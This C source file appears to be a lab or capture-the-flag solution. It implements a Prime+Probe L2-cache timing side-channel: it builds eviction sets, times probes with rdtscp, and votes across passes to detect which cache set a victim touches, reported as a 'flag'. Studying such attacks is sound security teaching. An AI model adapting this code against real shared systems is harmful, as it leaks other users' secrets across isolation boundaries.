#include "util.h"
#include <sys/mman.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define BUFF_SIZE (1<<21)
#define L2_WAYS 16
#ifndef STRIDE
#define STRIDE (1<<16)
#endif

// Inline rdtscp for timing
static inline uint64_t rdtscp(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

// Linked list node
struct node {
    struct node *next;
    char pad[64 - sizeof(struct node *)]; // Pad to cache line size
};

void *buf;
struct node *sets[1024]; // Pointers to the start of each set's list

// Shuffle an array of pointers
void shuffle(struct node **array, int n) {
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        struct node *temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
}

// Build shuffled linked list for a set
void build_set(int set_index) {
    char *base = (char *)buf;
    struct node *nodes[L2_WAYS];
    
    for (int i = 0; i < L2_WAYS; i++) {
        nodes[i] = (struct node *)(base + set_index * 64 + i * STRIDE);
    }
    
    shuffle(nodes, L2_WAYS);
    
    for (int i = 0; i < L2_WAYS - 1; i++) {
        nodes[i]->next = nodes[i+1];
    }
    nodes[L2_WAYS-1]->next = NULL;
    
    sets[set_index] = nodes[0];
}

// Prime the current set
void prime_set(int set_index) {
    struct node *curr = sets[set_index];
    while (curr) {
        curr = curr->next;
    }
}

// Probe the current set and return the access time
uint64_t probe_set(int set_index) {
    uint64_t start = rdtscp();
    struct node *curr = sets[set_index];
    while (curr) {
        curr = curr->next;
    }
    uint64_t end = rdtscp();
    return end - start;
}

// Structure to store results for sorting within a pass
typedef struct {
    int set_index;
    uint64_t latency;
} PassResult;

// Structure to store final scores
typedef struct {
    int set_index;
    int score;
} FinalScore;

int compare_pass_results(const void *a, const void *b) {
    PassResult *r1 = (PassResult *)a;
    PassResult *r2 = (PassResult *)b;
    if (r2->latency > r1->latency) return 1;
    if (r2->latency < r1->latency) return -1;
    return 0;
}

int compare_final_scores(const void *a, const void *b) {
    FinalScore *r1 = (FinalScore *)a;
    FinalScore *r2 = (FinalScore *)b;
    if (r2->score > r1->score) return 1;
    if (r2->score < r1->score) return -1;
    return 0;
}

int main(int argc, char const *argv[]) {
    srand(time(NULL));

    // Allocate huge page
    buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (buf == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    
    *((char *)buf) = 1; // dummy write

    printf("Building sets...\n");
    for (int i = 0; i < 1024; i++) {
        build_set(i);
    }

    printf("Scanning L2 sets (Voting/Mode Method)...\n");

    int scores[1024] = {0};
    
    // Parameters
    int total_passes = 100;
    int samples_per_pass = 200;
    int top_n_per_pass = 3; // Vote for top 3 in each pass

    PassResult pass_results[1024];

    for (int p = 0; p < total_passes; p++) {
        if (p % 10 == 0) {
            printf("Pass %d/%d...\n", p+1, total_passes);
            fflush(stdout);
        }

        // 1. Measure all sets
        for (int i = 0; i < 1024; i++) {
            uint64_t total_latency = 0;
            for (int k = 0; k < samples_per_pass; k++) {
                prime_set(i);
                for(volatile int w=0; w<2000; w++); // Wait
                total_latency += probe_set(i);
            }
            pass_results[i].set_index = i;
            pass_results[i].latency = total_latency / samples_per_pass;
        }

        // 2. Sort to find top N hottest sets in this pass
        qsort(pass_results, 1024, sizeof(PassResult), compare_pass_results);

        // 3. Vote
        for (int i = 0; i < top_n_per_pass; i++) {
            scores[pass_results[i].set_index]++;
        }
    }

    // Prepare final results
    FinalScore final_results[1024];
    for (int i = 0; i < 1024; i++) {
        final_results[i].set_index = i;
        final_results[i].score = scores[i];
    }

    // Sort by score (frequency)
    qsort(final_results, 1024, sizeof(FinalScore), compare_final_scores);

    printf("\nTop 5 Most Frequent High-Latency Sets (Max Score: %d):\n", total_passes);
    for (int i = 0; i < 5; i++) {
        printf("Set %d: Score %d\n", final_results[i].set_index, final_results[i].score);
    }

    // Heuristic: Pick the winner, but skip Set 0 if it's #1 and #2 is close or significant
    int detected_flag = final_results[0].set_index;
    if (detected_flag == 0 && final_results[1].score > (total_passes / 5)) {
        detected_flag = final_results[1].set_index;
    }

    printf("\nDetected Flag: %d\n", detected_flag);
    
    return 0;
}
